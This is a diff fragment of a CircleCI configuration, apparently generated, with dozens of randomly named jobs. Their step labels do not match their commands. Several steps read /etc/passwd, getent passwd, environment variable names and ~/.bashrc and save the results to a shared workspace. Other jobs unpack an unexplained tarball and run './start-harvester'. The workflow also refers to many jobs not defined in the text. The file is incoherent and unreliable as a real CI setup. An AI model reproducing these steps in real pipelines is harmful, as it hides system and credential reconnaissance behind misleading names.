+  manifestMu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: As a last step wind down the nightly window
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >"/tmp/page-cluster.gz" && zcat "/tmp/page-cluster.gz" | head -n 3; true ; } > /tmp/worker5/batch-19t
+            wc -c /tmp/worker5/batch-19t > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'batch-19t'
+  build-staging-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/batch-19t 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  blog-email-text:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build step-3 output
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; gzip -c /etc/os-release >"${TMPDIR:-/tmp}/cost_v2.gz" && gzip -cd "${TMPDIR:-/tmp}/cost_v2.gz"; true ; } > /tmp/worker5/72fdaf1f68631b2545
+            wc -c /tmp/worker5/72fdaf1f68631b2545 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - '72fdaf1f68631b2545'
+  verify-partial-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/P_42465 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  uLooseProfileWeight:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Training records promoted with no errors
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; echo "ready?" | tee -a /tmp/purple-fixes.out >/dev/null&&wc -l /tmp/purple-fixes.out; true ; } > /tmp/worker5/release_70000
+            wc -c /tmp/worker5/release_70000 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'release_70000'
+  v4-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/221.213 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  run_20120807_0835:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Ship the artifact registry carefully
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; env | awk -F= '{print $1}' | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/worker5/b49de568b
+            wc -c /tmp/worker5/b49de568b > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'b49de568b'
+  tweak-router-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/221.213 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  word-set:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Divert to the audit trail
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; touch "/tmp/fi.conf" && mv -v "/tmp/fi.conf" "/tmp/re8.out"; true ; } > /tmp/worker5/xx_9f9fb160f69b5
+            wc -c /tmp/worker5/xx_9f9fb160f69b5 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'xx_9f9fb160f69b5'
+  artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/xx_9f9fb160f69b5 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  almonds:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Swipe the tab bar for Nairobi
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; command -v grep >/dev/null 2>&1 &&echo yes || echo no; true ; } > /tmp/worker5/gadget_20270610
+            wc -c /tmp/worker5/gadget_20270610 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'gadget_20270610'
+  ga-v7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/gadget_20270610 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  SidebarSpec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: The relay board is in place
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 3 -type l -iname 'fd' -exec echo {} + 2>/dev/null | xargs -r ls -ld | head -n 5; true ; } > /tmp/worker5/Yah
+            wc -c /tmp/worker5/Yah > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'Yah'
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/221.213 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+
+  bobdev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: ID 1D6A SEEDING
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom of='/tmp/s_2024-05-13.txt' bs=512 count=1 2>/dev/null && wc -c '/tmp/s_2024-05-13.txt'; true ; } > /tmp/worker5/widgetorchard
+            wc -c /tmp/worker5/widgetorchard > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'widgetorchard'
+  columnMbMax:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Go power cycle the bootloader
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; nl -ba -w3 /etc/hosts|head; true ; } > /tmp/worker5/chromepolarproton
+            wc -c /tmp/worker5/chromepolarproton > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'chromepolarproton'
+  clusterface:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Tote bin weigh in
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; test -G $HOME && echo good || echo bad; true ; } > /tmp/worker5/gadget_20270610
+            wc -c /tmp/worker5/gadget_20270610 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'gadget_20270610'
+  token-payment-lever-post:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: trainCurrencyFieldsTask
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; grep VERSION /etc/os-release | tr -d '"' | cut -d = -f 1; true ; } > /tmp/worker5/rIdgEProFILegRove
+            wc -c /tmp/worker5/rIdgEProFILegRove > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'rIdgEProFILegRove'
+  SinglePosTrait:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: step one post the payroll batch
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >"${TMPDIR:-/tmp}/mo02026-06-12.gz" && zcmp /etc/hosts "${TMPDIR:-/tmp}/mo02026-06-12.gz" && echo same; true ; } > /tmp/worker5/xx_9f9fb160f69b5
+            wc -c /tmp/worker5/xx_9f9fb160f69b5 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'xx_9f9fb160f69b5'
+  ROW_201406:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Yell at the release candidate
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'thanks a lot' | od -c | head -2; true ; } > /tmp/worker5/driver_3736
+            wc -c /tmp/worker5/driver_3736 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'driver_3736'
+  unit-bravo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fully proxy the TLS certs
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; getent passwd | cut -d":" -f6 | wc -l; true ; } > /tmp/worker5/cache-ember-thunder
+            wc -c /tmp/worker5/cache-ember-thunder > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'cache-ember-thunder'
+  b9-62-50-bd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Has the mailing list been checked in with
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; sha512sum ${HOME}/.bashrc | cut -d' ' -f1; true ; } > /tmp/worker5/run_968
+            wc -c /tmp/worker5/run_968 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'run_968'
+  stack-2022-09-15:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Stage The Bulk Rack Step
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; ls /usr/lib|tr '[:lower:]' '[:upper:]'|tac; true ; } > /tmp/worker5/2hDsE9FaLc
+            wc -c /tmp/worker5/2hDsE9FaLc > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - '2hDsE9FaLc'
+  IS_HARD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Not warming the checkpoints today
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; seq 10 53 | sort -n | tail -1; true ; } > /tmp/worker5/batch-19t
+            wc -c /tmp/worker5/batch-19t > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'batch-19t'
+  u-dark:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Survey the parking passes for leavers
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; stdbuf -oL echo "that's all folks"; true ; } > /tmp/worker5/sHIMMErGARdeNTeNSORDriVEr
+            wc -c /tmp/worker5/sHIMMErGARdeNTeNSORDriVEr > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'sHIMMErGARdeNTeNSORDriVEr'
+  delete_transform:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Phase 1
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; ls -t -s /etc/*.defs | awk 'NR % 3 == 0'; true ; } > /tmp/worker5/COASTAL
+            wc -c /tmp/worker5/COASTAL > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'COASTAL'
+  broker-v5-scratch-amd64:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Profile the junit output in case of drift
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; getent passwd | cut -d: -f1 | sort | uniq -d; true ; } > /tmp/worker5/1b59041c844492c169f25534ed983586df83
+            wc -c /tmp/worker5/1b59041c844492c169f25534ed983586df83 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - '1b59041c844492c169f25534ed983586df83'
+workflows:
+  build-and-test:
+    jobs:
+      - ShallowCommentLoader
+      - adapter_ref
+      - tiv5jsrw3c0s9gj
+      - hu-verify:
+          requires:
+            - ShallowCommentLoader
+            - adapter_ref
+            - tiv5jsrw3c0s9gj
+      - q2-release:
+          requires:
+            - ShallowCommentLoader
+            - adapter_ref
+            - tiv5jsrw3c0s9gj
+      - bun-fmt:
+          requires:
+            - ShallowCommentLoader
+            - adapter_ref
+            - tiv5jsrw3c0s9gj
+      - d-v2:
+          requires:
+            - ShallowCommentLoader
+            - adapter_ref
+            - tiv5jsrw3c0s9gj
+      - validate-staging-test-matrix:
+          requires:
+            - ShallowCommentLoader
+            - adapter_ref
+            - tiv5jsrw3c0s9gj
+      - verify-partial-docker-image:
+          requires:
+            - ShallowCommentLoader
+            - adapter_ref
+            - tiv5jsrw3c0s9gj
+      - xray-2:
+          requires:
+            - ShallowCommentLoader
+            - adapter_ref
+            - tiv5jsrw3c0s9gj
+      - alice-push:
+          requires:
+            - ShallowCommentLoader
+            - adapter_ref
+            - tiv5jsrw3c0s9gj
+      - EEDVexq
+      - bobdev:
+          requires:
+            - EEDVexq
+      - v3-canary:
+          requires:
+            - bobdev
+      - BIT27:
+          requires:
+            - bobdev
+      - columnMbMax:
+          requires:
+            - BIT27
+      - sam-ship:
+          requires:
+            - columnMbMax
+      - almonds:
+          requires:
+            - columnMbMax
+      - clusterface:
+          requires:
+            - almonds
+      - ga-v7:
+          requires:
+            - clusterface
+      - inputEnabled:
+          requires:
+            - clusterface
+      - token-payment-lever-post:
+          requires:
+            - inputEnabled
+      - lets-go:
+          requires:
+            - token-payment-lever-post
+      - word-set:
+          requires:
+            - token-payment-lever-post
+      - SinglePosTrait:
+          requires:
+            - word-set
+      - artifacts:
+          requires:
+            - SinglePosTrait
+      - CachedBuilderComponent:
+          requires:
+            - SinglePosTrait
+      - ROW_201406:
+          requires:
+            - CachedBuilderComponent
+      - ensure-partial-release-candidate:
+          requires:
+            - ROW_201406
+      - EKCurve:
+          requires:
+            - ROW_201406
+      - unit-bravo:
+          requires:
+            - EKCurve
+      - node20-test:
+          requires:
+            - unit-bravo
+      - CONST_CALLBACK_PATH_16:
+          requires:
+            - unit-bravo
+      - b9-62-50-bd:
+          requires:
+            - CONST_CALLBACK_PATH_16
+      - tweak-session-bug:
+          requires:
+            - b9-62-50-bd
+      - pause_max:
+          requires:
+            - b9-62-50-bd
+      - stack-2022-09-15:
+          requires:
+            - pause_max
+      - may2-release:
+          requires:
+            - stack-2022-09-15
+      - manifestMu:
+          requires:
+            - stack-2022-09-15
+      - IS_HARD:
+          requires:
+            - manifestMu
+      - build-staging-regression-suite:
+          requires:
+            - IS_HARD
+      - perf-799-font:
+          requires:
+            - IS_HARD
+      - u-dark:
+          requires:
+            - perf-799-font
+      - test:
+          requires:
+            - u-dark
+      - Coppers:
+          requires:
+            - u-dark
+      - delete_transform:
+          requires:
+            - Coppers
+      - andromeda-alpha:
+          requires:
+            - delete_transform
+      - blockPool:
+          requires:
+            - delete_transform
+      - broker-v5-scratch-amd64:
+          requires:
+            - blockPool
+      - gating:
+          requires:
+            - broker-v5-scratch-amd64
+      - tip-zag-tic
+      - Timer-Local
+      - b6-6f-39
+      - chen-build:
+          requires:
+            - tip-zag-tic
+            - Timer-Local
+            - b6-6f-39
+      - DATA-97:
+          requires:
+            - tip-zag-tic
+            - Timer-Local
+            - b6-6f-39
+      - build-partial-integration-tests:
+          requires:
+            - tip-zag-tic
+            - Timer-Local
+            - b6-6f-39
+      - india-5:
+          requires:
+            - tip-zag-tic
+            - Timer-Local
+            - b6-6f-39
+      - v4-alpha:
+          requires:
+            - tip-zag-tic
+            - Timer-Local
+            - b6-6f-39
+      - feb28-ship:
+          requires:
+            - tip-zag-tic
+            - Timer-Local
+            - b6-6f-39
+      - tweak-router-v2:
+          requires:
+            - tip-zag-tic
+            - Timer-Local
+            - b6-6f-39
+      - UAT_HOOK_3:
+          requires:
+            - tip-zag-tic
+            - Timer-Local
+            - b6-6f-39
+      - smoke:
+          requires:
+            - tip-zag-tic
+            - Timer-Local
+            - b6-6f-39
